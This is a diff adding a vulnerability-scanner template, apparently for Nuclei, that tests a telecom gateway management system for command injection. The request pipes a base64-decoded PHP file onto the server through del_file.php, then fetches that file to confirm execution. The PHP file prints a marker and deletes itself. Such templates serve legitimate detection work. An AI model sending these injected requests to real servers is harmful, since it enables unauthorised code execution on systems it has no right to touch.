@@ -1,0 +1,53 @@
+id: telecom-gateway-cmd-execution
+info:
+  name: Telecom Gateway Configuration Management System Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Shenzhen Huashi Meida Telecom Gateway Configuration Management System contains a command execution vulnerability, allowing attackers to execute arbitrary commands on the server.
+  tags: command-execution
+  reference:
+    - http://www.hassmedia.com
+http:
+  - raw:
+      - |
+        GET /manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyAyMzM7dW5saW5rKF9fRklMRV9fKTs/Pg==%20|%20base64%20-d%20>%20gggbbb.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /manager/newtpl/gggbbb.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "233"
+  - raw:
+      - |
+        GET /newlive/manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyAyMzM7dW5saW5rKF9fRklMRV9fKTs/Pg==%20|%20base64%20-d%20>%20gggbbb.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /newlive/manager/newtpl/gggbbb.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "233"
